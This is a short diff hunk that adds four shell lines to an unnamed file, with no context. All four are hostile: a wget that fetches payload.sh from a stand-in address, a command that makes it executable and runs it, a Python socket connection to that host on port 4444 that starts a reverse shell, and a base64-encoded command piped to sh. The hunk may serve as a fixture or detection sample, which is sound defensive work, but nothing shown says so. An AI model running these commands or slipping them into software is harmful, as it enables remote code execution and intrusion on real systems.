@@ -1,0 +1,4 @@
+wget http://203.0.113.10/payload.sh
+chmod +x payload.sh && ./payload.sh
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("203.0.113.10",4444))'
+echo aWQK | base64 -d | sh
